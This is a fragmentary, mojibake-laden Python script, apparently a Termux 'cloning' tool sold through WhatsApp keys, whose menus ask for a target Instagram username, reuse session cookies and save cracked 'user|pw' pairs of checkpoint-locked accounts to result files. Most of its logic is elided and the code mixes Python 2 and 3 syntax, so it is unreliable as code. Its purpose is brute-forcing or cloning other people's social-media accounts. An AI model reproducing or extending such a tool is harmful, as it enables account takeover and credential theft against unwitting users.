...
'\x1b[1;91m' à¼„Mrð™§á­„â€¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢à¼„SUBHANð™§á­„
...
'\x1b[1;91m' à¼„Mrð™§á­„â€¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢à¼„Khanð™§á­„
"""
dec="2"
server="2"
...
def main_apv():
    ...
    try:
        ...
        kok.close()
        print ("")
        print ("'\x1b[1;91m'           This Is Your Key ðŸ—ï¸ðŸ‘†")
        print ("'\x1b[1;93m'           Copy The Key in Send Me on WhatsApp ")
        print ("")
        print ("")
        print ("")
        print('\x1b[1;92m'            If You Subscribe your Key ðŸ—ï¸ !")
        raw_input("  then Exit The Termux And Put The Commond And run Again Thanks â£ï¸")
    ...
    if key1 in r1:
        ...
        print ("\x1b[1;94m'            Press Enter To Subscribe Your key ðŸ—ï¸")
        print ("\x1b[1;94m'            And Contact Me On Whatsapp Thanks ")
        print ("")
        print ("         YOUR KEY : "+key1)
        print ("")
        print ("\x1b[1;94m'            This is Your key ðŸ—ï¸ ðŸ‘†")
        print ("\x1b[1;94m'            Copy Your Key ðŸ—ï¸ And Send To The Admin On Whatsapp")
        print ("")
        print ("")
        print ("")
...
def numcloning():
    ...
    print ""
    os.system('echo " à¼„Mrð™§á­„â€¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢à¼„SUBHANð™§á­„"| lolcat')
...
def moch_yayan():
    ...
    if len(id)!=0:
        ...
        print("\n %s[%sÃ—%s] gagal mengambil id, silahkan coba lagi"%(N,M,N));time.sleep(2);moch_yayan()
...
def beli_key():
    ...
    while pil == "":
        print("\n %s[%sÃ—%s] jangan kosong bro"%(N,M,N));time.sleep(2);beli_key()
    if pil == "1":
        ...
        print("\n %s[%sÃ—%s] input yang bener"%(N,M,N));time.sleep(2);beli_key()
        ...
        with requests.Session() as ses:
            try:
                ...
                if "users" in json.loads(otw.content):
                    ...
                    print('\n %s[%sÃ—%s] cookie invalid'%(N,M,N));time.sleep(2);os.system('rm -rf ig.txt');masuk_ig()
            except ValueError:
                print('\n %s[%sÃ—%s] cookie invalid'%(N,M,N));time.sleep(2);os.system('rm -rf ig.txt');masuk_ig()
...
def menu_igeh():
    ...
    pepek = input('\n [%s+%s] input : '%(H,N))
    if pepek in['']:
        print('\n %s[%sÃ—%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);menu_igeh()
    elif pepek in['1','01']:
        pw = ""
        status = ""
        username = input('\n [%sâ€¢%s] Username target : '%(O,N))
        ...
        if kuntul in['']:
            ...
            print('\n %s[%sÃ—%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,kuntul,N));time.sleep(2);menu_igeh()
    elif pepek in['2','02']:
        jalan('\n %s[%s+%s] Masukan nama yang mau anda cari. contoh : %sMark%s'%(N,O,N,H,N))
        user = input('\n [%sâ€¢%s] Masukan nama : '%(O,N))
        ...
        print('\n %s[%sÃ—%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N));time.sleep(2);menu_igeh()
        ...
        try:
            ...
            with requests.Session() as ses:
                ...
                if "checkpoint_url" in str(data):
                    cepeh = "Checkpoint"
                    ingfo(user, pw, cepeh)
                    open('results/IG-CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" [Ã—] "+user+"|"+pw+"\n")
                    cp.append(user)
                    break
